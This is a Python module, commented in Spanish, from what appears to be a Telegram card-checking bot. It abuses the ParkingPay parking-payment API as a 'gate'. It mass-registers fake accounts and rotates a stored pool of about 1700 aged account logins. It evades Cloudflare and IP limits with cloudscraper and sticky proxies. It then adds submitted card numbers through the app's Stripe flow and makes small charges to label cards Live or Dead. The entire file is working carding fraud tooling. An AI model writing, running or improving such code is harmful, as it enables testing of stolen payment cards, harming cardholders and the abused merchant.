"""Core de gates con generación dinámica de cuentas y limpieza de cloudscraper."""
from __future__ import annotations

import asyncio
import csv
import json
import logging
import os
import random
import threading
import string
import time
from collections import defaultdict
from datetime import datetime
from typing import Callable, Dict, List, Optional, Tuple

import cloudscraper
import requests

from bot.config import gate_proxy

logger = logging.getLogger(__name__)


# Qué pool de proxies usa cada gate. "mx" = proxies sticky MX;
# "rot" = proxies rotatorios/USA. Todo el flujo de un gate usa el mismo pool.
GATE_PROXY_POOL = {
    "Euridice": "mx",
    "Philotes": "mx",
    "Eurinias": "mx",
    "Wojtek": "mx",
}


def _pick_proxy(pool: str = "mx") -> Optional[dict]:
    """Estrena un proxy sticky (con lifetime) del pool indicado.

    Cada flujo usa un solo proxy de principio a fin: en los masivos se pide
    una vez y se comparte entre todas las tarjetas del lote.
    """
    proxy_url = gate_proxy(pool)
    if not proxy_url:
        return None
    return {"http": proxy_url, "https": proxy_url}


# Lifetime de la sesión sticky para un lote masivo: debe aguantar el lote
# entero (10 tarjetas x ~30s ≈ 5+ min). Sesiones cortas expiran a mitad del
# lote y las tarjetas finales caen por conexión.
_MASS_STICKY_LIFETIME = "10m"


def _pick_fresh_proxy(pool: str = "mx") -> Optional[dict]:
    """Proxy sticky NUEVO (sesión distinta a la URL estática del .env).

    Los masivos no deben reusar la URL estática ``IPROYAL_STICKY_MX_URL``:
    todo el tráfico de los 4 gates saldría por la misma IP y un lote largo
    satura el mismo túnel.

    IMPORTANTE: la sesión nueva se clona de la propia URL estática (mismo
    usuario, misma base de password, mismo host/puerto), cambiando solo el
    ``_session-`` y el ``_lifetime-``. Armar la cadena desde
    ``IPROYAL_USERNAME``/``IPROYAL_PASSWORD_BASE`` NO sirve: esas credenciales
    no tienen la función necesaria y el proxy responde
    ``403 Feature not enabled: streaming``.
    """
    import re
    import urllib.parse

    static_url = gate_proxy(pool)
    if static_url:
        try:
            parts = urllib.parse.urlparse(static_url)
            pwd = urllib.parse.unquote(parts.password or "")
            session = "".join(
                random.choices(string.ascii_letters + string.digits, k=8)
            )
            if "_session-" in pwd:
                pwd = re.sub(r"_session-[A-Za-z0-9]+", f"_session-{session}", pwd)
            else:
                pwd = f"{pwd}_session-{session}"
            if "_lifetime-" in pwd:
                pwd = re.sub(r"_lifetime-[0-9]+[smhd]", f"_lifetime-{_MASS_STICKY_LIFETIME}", pwd)
            else:
                pwd = f"{pwd}_lifetime-{_MASS_STICKY_LIFETIME}"
            fresh = urllib.parse.urlunparse((
                parts.scheme,
                f"{parts.username}:{urllib.parse.quote(pwd, safe='')}@{parts.hostname}"
                + (f":{parts.port}" if parts.port else ""),
                parts.path or "",
                parts.params or "",
                parts.query or "",
                parts.fragment or "",
            ))
            return {"http": fresh, "https": fresh}
        except Exception as exc:
            logger.debug("No se pudo clonar proxy sticky: %s", exc)
            return {"http": static_url, "https": static_url}
    return _pick_proxy(pool)


# ---------------------------------------------------------------------------
# Configuración de la API objetivo
# ---------------------------------------------------------------------------
API_BASE = "https://parkingpay-api-prod.azurewebsites.net"
REGISTER_URL = f"{API_BASE}/api/app/usuarios/registro"
LOGIN_URL = f"{API_BASE}/api/auth"
TARJETAS_URL = f"{API_BASE}/api/app/conductor/tarjetas"
CONDUCTOR_URL = f"{API_BASE}/api/app/conductor"
ABONO_URL = f"{API_BASE}/api/app/conductor/pagos/abono"

# La API parece rechazar abonos sobre cuentas/tarjetas recién dadas de
# alta (502 "No se pudo generar el abono con el proveedor") si el cargo
# se dispara demasiado pronto. La app manual pasa con ~40s de gap entre
# el alta y el abono; las rondas del bot lo hacían a los ~13s. Esperar
# a que la tarjeta "madure" dentro de la cuenta antes del cobro.
# Ajustable con PARKINGPAY_ABONO_DELAY (segundos desde el ALTA).
ABONO_DELAY = float(os.getenv("PARKINGPAY_ABONO_DELAY", "40"))

# Pool de cuentas envejecidas: desde ~2026-09-20 ParkingPay rechaza el
# abono (502 del proveedor) contra cuentas recién registradas, aunque no
# las recién-altas en sí. Giro verificado 2026-11-05: la misma tarjeta
# 502-ó tres veces en cuentas frescas y abonó OK al primer intento en
# una cuenta vieja re-logineada. El CSV (copia del pool del bot viejo)
# trae email/password de ~1700 cuentas ya maduras; se reloguea por ronda
# porque los JWT de archivo caducan (403).
_AGED_ACCOUNTS_PATH = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
    "data", "parkingpay_cuentas.csv",
)
# Tarjetas por cuenta dentro de un lote masivo (alineado al límite de
# 10 tarjetas por edición de Telegram en /mass).
_CARDS_PER_ACCOUNT = 10

MONTOS = {
    "Euridice": 100.0,
    "Philotes": 1.0,
    "Eurinias": 20.0,
    "Wojtek": 50.0,
}

# ---------------------------------------------------------------------------
# Datos para generación dinámica de cuentas
# ---------------------------------------------------------------------------
_NOMBRES = [
    "Juan", "Pedro", "Luis", "Carlos", "Miguel", "Jose", "Francisco",
    "Antonio", "Alejandro", "Javier", "Ricardo", "Fernando", "Roberto",
    "Sergio", "Arturo", "Maria", "Ana", "Laura", "Carmen", "Rosa",
    "Guadalupe", "Martha", "Patricia", "Gabriela", "Alejandra",
    "Adriana", "Monica", "Veronica", "Claudia", "Sandra",
]
_APELLIDOS = [
    "Garcia", "Lopez", "Martinez", "Rodriguez", "Hernandez", "Gonzalez",
    "Perez", "Sanchez", "Ramirez", "Cruz", "Flores", "Morales",
    "Vazquez", "Jimenez", "Torres", "Reyes", "Castillo", "Ortiz",
    "Mendoza", "Ruiz",
]
_DOMINIOS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "proton.me"]

# ---------------------------------------------------------------------------
# Control de concurrencia
# ---------------------------------------------------------------------------
_global_semaphore = asyncio.Semaphore(15)
_user_semaphores: Dict[int, asyncio.Semaphore] = defaultdict(lambda: asyncio.Semaphore(3))

_active_requests_count = 0
_user_request_count: Dict[int, int] = defaultdict(int)


# ---------------------------------------------------------------------------
# Utilidades de generación de datos
# ---------------------------------------------------------------------------
def _random_string(n: int = 10) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _random_phone() -> str:
    lada = random.choice(["332", "555", "810", "449", "222", "477", "686", "664", "612", "667"])
    return lada + "".join(random.choices("0123456789", k=7))


def _random_email() -> str:
    timestamp = int(time.time() * 1000) % 100000
    return f"{_random_string(6)}{timestamp}@{random.choice(_DOMINIOS)}"


def _random_password() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))


# ---------------------------------------------------------------------------
# Gate apagado: mensaje simple (sin horarios) + regla nocturna
# ---------------------------------------------------------------------------
try:
    from zoneinfo import ZoneInfo
    _MX_TZ = ZoneInfo("America/Mexico_City")
except Exception:
    _MX_TZ = None

# Después de las 8:20pm (hora México) un error es casi seguro gate apagado.
_HORA_CORTE_NOCTURNO = (20, 20)


class _ApiApagada(Exception):
    """El API del comercio está apagado (Azure detenido)."""


def _es_pagina_apagada(status_code: int, texto: str) -> bool:
    """Detecta la página de Azure cuando la web app está detenida."""
    if status_code != 403:
        return False
    t = (texto or "").lower()
    return "unavailable" in t or "stopped" in t or "web app" in t


def _es_noche_apagado(ahora=None) -> bool:
    """True si en México ya pasó la hora de corte nocturno."""
    try:
        ahora = ahora or (datetime.now(_MX_TZ) if _MX_TZ else datetime.now())
    except Exception:
        ahora = ahora or datetime.now()
    return (ahora.hour, ahora.minute) >= _HORA_CORTE_NOCTURNO


def _mensaje_apagado(gate_name: str) -> Dict[str, str]:
    return {
        "status": "🔌 Apagado",
        "message": f"Gate {gate_name} apagado.",
    }


def _obtener_token(proxies: Optional[dict] = None) -> Optional[str]:
    """Registra una cuenta nueva y devuelve su token JWT (o None si falla)."""
    return _register_account(proxies=proxies)


# ---------------------------------------------------------------------------
# Registro dinámico de cuenta
# ---------------------------------------------------------------------------
def _register_account(proxies: Optional[dict] = None) -> Optional[str]:
    """Registra una cuenta nueva en la API y devuelve su token JWT.

    Esta función es bloqueante; debe llamarse vía asyncio.to_thread.
    Se encarga de crear y cerrar su propio scraper para no dejar hilos
    ni conexiones huérfanos.

    Si se pasa `proxies`, se reutiliza el mismo para todo el flujo y no
    se cambia de proxy entre etapas.
    """
    scraper = cloudscraper.create_scraper(
        browser={"browser": "chrome", "platform": "ios", "mobile": True},
        delay=2,
    )
    if proxies is None:
        proxies = _pick_proxy()
    if proxies:
        scraper.proxies = proxies
    try:
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8",
        }
        nombre = random.choice(_NOMBRES)
        apellido = random.choice(_APELLIDOS)
        email = _random_email()
        password = _random_password()
        telefono = _random_phone()

        datos = {
            "Nombre": nombre,
            "Apellidos": apellido,
            "Telefono": telefono,
            "CorreoElectronico": email,
            "Contrasena": password,
            "ConfirmarContrasena": password,
        }

        r = scraper.post(REGISTER_URL, json=datos, headers=headers, timeout=15)
        if _es_pagina_apagada(r.status_code, r.text):
            raise _ApiApagada()
        if r.status_code not in (200, 201):
            logger.warning("ParkingPay registro falló: HTTP %s - %s", r.status_code, r.text[:120])
            return None

        login_data = {"CorreoElectronico": email, "Contrasena": password}
        r2 = scraper.post(LOGIN_URL, json=login_data, headers=headers, timeout=15)
        if r2.status_code in (200, 201):
            data = r2.json()
            token = data.get("token")
            if token:
                return token
        logger.warning("ParkingPay login falló: HTTP %s - %s", r2.status_code, r2.text[:120])
        return None
    except Exception as exc:
        logger.warning("Error en registro dinámico ParkingPay: %s", exc)
        return None
    finally:
        try:
            scraper.close()
        except Exception:
            pass


def _obtener_token(proxies: Optional[dict] = None) -> Optional[str]:
    """Registra una cuenta nueva y devuelve su token JWT (o None si falla)."""
    return _register_account(proxies=proxies)


_AGED_STATE = threading.Lock()
_aged_cache: Optional[List[Tuple[str, str]]] = None
_aged_pointer = 0


def _load_aged_accounts() -> List[Tuple[str, str]]:
    global _aged_cache
    if _aged_cache is None:
        rows: List[Tuple[str, str]] = []
        try:
            with open(_AGED_ACCOUNTS_PATH, newline="", encoding="utf-8") as fh:
                for row in csv.DictReader(fh):
                    email = (row.get("email") or "").strip()
                    password = (row.get("password") or "").strip()
                    if email and password:
                        rows.append((email, password))
        except FileNotFoundError:
            logger.warning("ParkingPay pool de cuentas envejecidas no encontrado: %s", _AGED_ACCOUNTS_PATH)
        except OSError as exc:
            logger.warning("ParkingPay no se pudo leer el pool de cuentas: %s", exc)
        _aged_cache = rows
        if rows:
            logger.info("ParkingPay pool de cuentas envejecidas cargado: %s cuentas", len(rows))
    return _aged_cache


def _obtener_token_aged(
    proxies: Optional[dict] = None,
    pedir: int = 1,
) -> List[str]:
    """Loginea cuentas envejecidas del pool y devuelve JWTs vivos.

    Devuelve hasta `pedir` tokens de cuentas DISTINTAS en rotación
    secuencial sobre el CSV. Si el login falla en una cuenta, se salta a
    la siguiente. Sin pool, o si nada loginea, devuelve lista vacía y el
    caller decide el fallback (registro dinámico).
    """
    global _aged_pointer
    with _AGED_STATE:
        rows = _load_aged_accounts()
        total = len(rows)
        if total == 0:
            return []
        start = _aged_pointer

    tokens: List[str] = []
    scraper: Optional[cloudscraper.CloudScraper] = None
    try:
        usadas = 0
        for k in range(total):
            if len(tokens) >= max(1, pedir):
                break
            email, password = rows[(start + k) % total]
            usadas += 1
            if scraper is None:
                scraper = cloudscraper.create_scraper(
                    browser={"browser": "chrome", "platform": "ios", "mobile": True},
                    delay=2,
                )
                if proxies:
                    scraper.proxies = proxies
            try:
                r = scraper.post(
                    LOGIN_URL,
                    json={"CorreoElectronico": email, "Contrasena": password},
                    headers={
                        "user-agent": "Dart/2.18 (dart:io)",
                        "content-type": "application/json; charset=utf-8",
                    },
                    timeout=20,
                )
                if _es_pagina_apagada(r.status_code, r.text):
                    raise _ApiApagada()
                if r.status_code in (200, 201):
                    token = r.json().get("token")
                    if token:
                        tokens.append(token)
            except _ApiApagada:
                raise
            except Exception as exc:
                logger.debug("ParkingPay login envejecido falló (%s): %s", email, exc)
        with _AGED_STATE:
            _aged_pointer = (start + (usadas or 1)) % total
        if tokens:
            logger.info(
                "ParkingPay tokens envejecidos: %s/%s vivos (rotación desde cuenta #%s)",
                len(tokens), pedir, start,
            )
        return tokens
    finally:
        if scraper is not None:
            try:
                scraper.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Validación de tarjeta
# ---------------------------------------------------------------------------
def procesar_y_validar(card_data: str) -> Optional[Tuple[str, str, str, str]]:
    try:
        parts = card_data.split("|")
        if len(parts) != 4:
            return None

        cc_number, mes, ano, cvv = parts

        if not cc_number.isdigit() or len(cc_number) < 13 or len(cc_number) > 19:
            return None

        try:
            mes_int = int(mes)
            if mes_int < 1 or mes_int > 12:
                return None
        except ValueError:
            return None

        try:
            ano_int = int(ano)
            if len(ano) == 4:
                if ano_int < 2000 or ano_int > 2099:
                    return None
                ano_2_digits = str(ano_int)[-2:]
            elif len(ano) == 2:
                if ano_int < 0 or ano_int > 99:
                    return None
                ano_2_digits = ano
            else:
                return None
        except ValueError:
            return None

        if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
            return None

        return cc_number, mes, ano_2_digits, cvv
    except Exception as exc:
        logger.debug("Error validando tarjeta: %s", exc)
        return None


# ---------------------------------------------------------------------------
# Petición al gate con limpieza estricta de cloudscraper
# ---------------------------------------------------------------------------
async def _make_gate_request_inner(
    gate_name: str,
    card_data: str,
    user_id: int,
    shared_proxies: Optional[dict] = None,
    shared_token: Optional[str] = None,
) -> Dict[str, str]:
    global _active_requests_count
    _active_requests_count += 1
    scraper: Optional[cloudscraper.CloudScraper] = None

    try:
        resultado = procesar_y_validar(card_data)
        if resultado is None:
            return {"status": "❌ Dead", "message": "Fechas Invalidas"}

        cc_number, mes, ano, cvv = resultado
        # La app manda el mes siempre a 2 dígitos ("06", no "6").
        # Si el usuario manda un solo dígito, normalizar aquí: el API
        # rechaza o evalúa distinto el formato corto.
        try:
            mes = f"{int(mes):02d}"
        except ValueError:
            return {"status": "❌ Dead", "message": "Fechas Invalidas"}

        # Si no nos pasaron proxy, elegimos uno del pool correspondiente a este gate.
        proxies = shared_proxies or _pick_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))

        if shared_token:
            token = shared_token
        else:
            try:
                aged = await asyncio.to_thread(_obtener_token_aged, proxies, 1)
                token = aged[0] if aged else None
            except _ApiApagada:
                return _mensaje_apagado(gate_name)
            if not token:
                try:
                    token = await asyncio.to_thread(_obtener_token, proxies)
                except _ApiApagada:
                    return _mensaje_apagado(gate_name)
        if not token:
            return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error creando la cuenta del gate, intenta de nuevo"}

        scraper = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "ios", "mobile": True},
            delay=2,
        )
        if proxies:
            scraper.proxies = proxies

        inicio = datetime.now()
        headers = {
            "user-agent": "Dart/2.18 (dart:io)",
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "authorization": token,
            "host": "parkingpay-api-prod.azurewebsites.net",
        }

        # Paso 1: Añadir tarjeta
        response = await asyncio.to_thread(
            scraper.post,
            url=TARJETAS_URL,
            data=f'{{"numero":"{cc_number}","expiracionMes":"{mes}","expiracionYear":"20{ano}"}}',
            headers=headers,
            timeout=20,
        )

        alta_ts = datetime.now()

        await asyncio.sleep(5)

        if "This web app is stopped" in response.text or response.status_code == 403:
            return _mensaje_apagado(gate_name)

        if response.status_code == 400 or "Ocurrió un error al crear la tarjeta en stripe" in response.text:
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            logger.warning("ParkingPay ALTA declinada %s: HTTP %s %s", gate_name, response.status_code, (response.text or "")[:200])
            return {"status": "❌ Dead", "message": f"Dead - {tiempo} segundos"}

        try:
            stripe_card_id = json.loads(response.text)["stripeCardId"]
        except (KeyError, json.JSONDecodeError):
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            logger.warning("ParkingPay ALTA sin stripeCardId %s: HTTP %s %s", gate_name, response.status_code, (response.text or "")[:200])
            return {"status": "❌ Dead", "message": f"No se pudo obtener stripeCardId - {tiempo} segundos"}

        await asyncio.sleep(3)

        # Paso 2: Obtener tarjetaId
        response = await asyncio.to_thread(
            scraper.get,
            url=CONDUCTOR_URL,
            headers={
                **headers,
                "content-type": "application/json",
            },
            timeout=20,
        )

        tarjeta_id = None
        try:
            for tarjeta in json.loads(response.text)["cartera"]["tarjetas"]:
                if tarjeta["stripeInfo"]["stripeCardId"] == stripe_card_id:
                    tarjeta_id = tarjeta["tarjetaId"]
                    break
        except (KeyError, TypeError, json.JSONDecodeError):
            pass

        await asyncio.sleep(5)

        if not tarjeta_id:
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            return {"status": "❌ Dead", "message": f"No se encontró tarjetaId - {tiempo} segundos"}

        monto = MONTOS.get(gate_name, 100.0)

        # Philotes solo asocia la tarjeta; no hace cargo
        if gate_name == "Philotes":
            tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
            return {"status": "✅ Live", "message": f"Charger {monto} Mnx - {tiempo} segundos"}

        # Espera de maduración: ParkingPay rechaza el abono (502 del
        # proveedor) si el cobro llega demasiado pronto tras el alta.
        # Segundos ya consumidos desde el ALTA corren a favor (sleeps
        # fijos + latencia), solo se congela el faltante.
        madurez = (datetime.now() - alta_ts).total_seconds()
        falta = ABONO_DELAY - madurez
        if falta > 0:
            logger.info("ParkingPay esperando madurez %s: %.1fs restantes", gate_name, falta)
            await asyncio.sleep(falta)

        # Paso 3: Realizar cargo
        response = await asyncio.to_thread(
            scraper.post,
            url=ABONO_URL,
            data=f'{{"tarjetaId":"{tarjeta_id}","porAbonar":{monto}}}',
            headers=headers,
            timeout=20,
        )

        tiempo = f"{(datetime.now() - inicio).total_seconds():.2f}"
        cuerpo = response.text or ""
        if "stripeCardId" in cuerpo or response.status_code == 200:
            logger.info("ParkingPay abono OK %s: HTTP %s %s", gate_name, response.status_code, cuerpo[:200])
            return {"status": "✅ Live", "message": f"Charger {monto} Mnx - {tiempo} segundos"}

        # Veredicto por señal, no por descarte: solo es Dead si el backend
        # dice que el cargo no pasó. Una respuesta inesperada (500, HTML,
        # validación) es error de herramienta, no tarjeta muerta: antes
        # caía a Dead genérico y quemaba lives como declinadas.
        bajo = cuerpo.lower()
        if any(k in bajo for k in ("no se pudo generar", "declin", "insuficiente", "fondos", "rechaz", "do not honor", "do_not_honor")):
            logger.warning("ParkingPay abono declinado %s: HTTP %s %s", gate_name, response.status_code, cuerpo[:200])
            return {"status": "❌ Dead", "message": f"Tarjeta declinada - {tiempo} segundos"}
        logger.warning("ParkingPay abono sin veredicto %s: HTTP %s %s", gate_name, response.status_code, cuerpo[:200])
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error avisar a un administrador"}

    except _ApiApagada:
        return _mensaje_apagado(gate_name)
    except requests.exceptions.RequestException as exc:
        logger.warning("Error de red en gate %s (user=%s): %s", gate_name, user_id, exc)
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error de conexión con el gate"}
    except Exception as exc:
        logger.exception("Error REAL en gate %s (oculto al usuario): %s", gate_name, exc)
        return {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error avisar a un administrador"}
    finally:
        _active_requests_count -= 1
        if scraper is not None:
            try:
                scraper.close()
            except Exception:
                pass
            # Liberar explícitamente el adaptador de conexiones para evitar
            # fugas de hilos/pools de urllib3 entre peticiones.
            try:
                scraper.mount("https://", requests.adapters.HTTPAdapter())
                scraper.mount("http://", requests.adapters.HTTPAdapter())
            except Exception:
                pass


# ---------------------------------------------------------------------------
# API pública
# ---------------------------------------------------------------------------
async def _make_gate_request(
    gate_name: str,
    card_data: str,
    user_id: int,
    shared_proxies: Optional[dict] = None,
    shared_token: Optional[str] = None,
) -> Dict[str, str]:
    """Envuelve el flujo del gate aplicando la regla nocturna.

    Los veredictos (Live/Dead) se respetan siempre: si hubo veredicto,
    el gate está encendido. Pero un error después de las 8:20pm
    (hora México) es casi seguro gate apagado y se reporta como tal.
    """
    result = await _make_gate_request_inner(gate_name, card_data, user_id, shared_proxies, shared_token)
    if result.get("status") == "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error" and _es_noche_apagado():
        return _mensaje_apagado(gate_name)
    return result


async def gate_check(gate_name: str, card_data: str, user_id: Optional[int] = None) -> Dict[str, str]:
    uid = user_id if user_id is not None else 0
    _user_request_count[uid] += 1
    try:
        async with _global_semaphore:
            async with _user_semaphores[uid]:
                logger.debug(
                    "Usuario %s - Iniciando %s para %sxxxx",
                    uid, gate_name, card_data[:6],
                )
                await asyncio.sleep(0.1 + (uid % 5) * 0.05)
                return await _make_gate_request(gate_name, card_data, uid)
    finally:
        _user_request_count[uid] -= 1


async def gate_check_multiple(
    gate_name: str,
    cards_data: List[str],
    user_id: Optional[int] = None,
    callback: Optional[Callable[[int, Dict[str, str], str, int], None]] = None,
) -> List[Dict[str, str]]:
    uid = user_id if user_id is not None else 0
    cards_clean = [card.strip() for card in cards_data if card.strip()]
    total = len(cards_clean)

    if total == 0:
        return []

    # Proxy NUEVO por lote (sesión distinta a la URL estática del .env) con
    # lifetime suficiente para el lote entero (~10m para 10 x ~30s).
    shared_proxies = _pick_fresh_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))

    # Un token (cuenta) por bloque de tarjetas: igual evitamos registrar
    # N cuentas desde la misma IP y recortar el tiempo del lote. Con el
    # pool envejecido se reparten entre cuentas maduras con techo de 15
    # tarjetas por cuenta; si el pool no rinde, cae al registro dinámico
    # (1 token para todo el lote) y en última instancia a token por
    # tarjeta como antes.
    n_cuentas = max(1, (total + _CARDS_PER_ACCOUNT - 1) // _CARDS_PER_ACCOUNT)
    shared_tokens: List[str] = []
    try:
        shared_tokens = await asyncio.to_thread(_obtener_token_aged, shared_proxies, n_cuentas)
    except _ApiApagada:
        apagado = _mensaje_apagado(gate_name)
        results_apagado = [dict(apagado) for _ in cards_clean]
        if callback:
            for i, card in enumerate(cards_clean):
                try:
                    await callback(i, dict(apagado), card, uid)
                except Exception as cb_err:
                    logger.debug("Error en callback tarjeta %s: %s", i + 1, cb_err)
        return results_apagado
    if shared_tokens:
        logger.info(
            "Mass %s: %s cuentas envejecidas para %s tarjetas (%s/cuenta)",
            gate_name, len(shared_tokens), total, _CARDS_PER_ACCOUNT,
        )
    else:
        shared_tokens = []
    if not shared_tokens:
        try:
            fallback_token = await asyncio.to_thread(_obtener_token, shared_proxies)
        except _ApiApagada:
            apagado = _mensaje_apagado(gate_name)
            results_apagado = [dict(apagado) for _ in cards_clean]
            if callback:
                for i, card in enumerate(cards_clean):
                    try:
                        await callback(i, dict(apagado), card, uid)
                    except Exception as cb_err:
                        logger.debug("Error en callback tarjeta %s: %s", i + 1, cb_err)
            return results_apagado
        if fallback_token:
            shared_tokens = [fallback_token]
        else:
            logger.warning("Mass %s: sin token compartido, cada tarjeta usará el suyo", gate_name)

    results: List[Optional[Dict[str, str]]] = [None] * total
    result_queue: asyncio.Queue[Tuple[int, Dict[str, str]]] = asyncio.Queue()

    _CONN_ERROR = "Error de conexión con el gate"

    async def process_single_card(index: int, card_data: str) -> Dict[str, str]:
        max_retries = 3
        retry = 0
        proxies = shared_proxies
        token = None
        if shared_tokens:
            chunk = (index // _CARDS_PER_ACCOUNT) % len(shared_tokens)
            token = shared_tokens[chunk]
        while retry < max_retries:
            try:
                async with _global_semaphore:
                    async with _user_semaphores[uid]:
                        await asyncio.sleep(0.1 + (index % 5) * 0.05)
                        result = await _make_gate_request(gate_name, card_data, uid, proxies, token)
                        # El dict de error de conexión ya venía capturado adentro y
                        # por eso nunca reintentaba: aquí sí se reintenta, con
                        # proxy y token frescos, antes de darlo por perdido.
                        if result.get("message") == _CONN_ERROR and retry + 1 < max_retries:
                            retry += 1
                            logger.warning(
                                "Mass %s tarjeta %s: error de conexión, reintento %s/%s con proxy nuevo",
                                gate_name, index + 1, retry + 1, max_retries,
                            )
                            await asyncio.sleep(3)
                            proxies = _pick_fresh_proxy(GATE_PROXY_POOL.get(gate_name, "mx"))
                            token = None
                            continue
                        await result_queue.put((index, result))
                        return result
            except Exception as exc:
                logger.debug("Reintento %s/%s fallido para tarjeta %s: %s", retry + 1, max_retries, index + 1, exc)
                retry += 1
                if retry < max_retries:
                    await asyncio.sleep(3)

        error_result = {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Error al procesar tarjeta tras reintentos"}
        await result_queue.put((index, error_result))
        return error_result

    async def process_results() -> None:
        processed = 0
        while processed < total:
            try:
                index, result = await asyncio.wait_for(result_queue.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if all(task.done() for task in tasks):
                    while not result_queue.empty():
                        try:
                            index, result = result_queue.get_nowait()
                            if results[index] is None:
                                results[index] = result
                                processed += 1
                                if callback:
                                    await callback(index, result, cards_clean[index], uid)
                        except asyncio.QueueEmpty:
                            break
                    for i in range(total):
                        if results[i] is None:
                            results[i] = {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Tarjeta no procesada (timeout interno)"}
                            processed += 1
                    break
                continue

            if results[index] is None:
                results[index] = result
                processed += 1
                if callback:
                    try:
                        await callback(index, result, cards_clean[index], uid)
                    except Exception as cb_err:
                        logger.debug("Error en callback tarjeta %s: %s", index + 1, cb_err)

    tasks = [asyncio.create_task(process_single_card(i, card)) for i, card in enumerate(cards_clean)]
    processor = asyncio.create_task(process_results())

    await asyncio.gather(*tasks, return_exceptions=True)
    for task in tasks:
        if not task.done():
            task.cancel()

    await processor
    return [r if r is not None else {"status": "<tg-emoji emoji-id=\"5021618274345943603\">⚠️</tg-emoji> Error", "message": "Sin resultado"} for r in results]
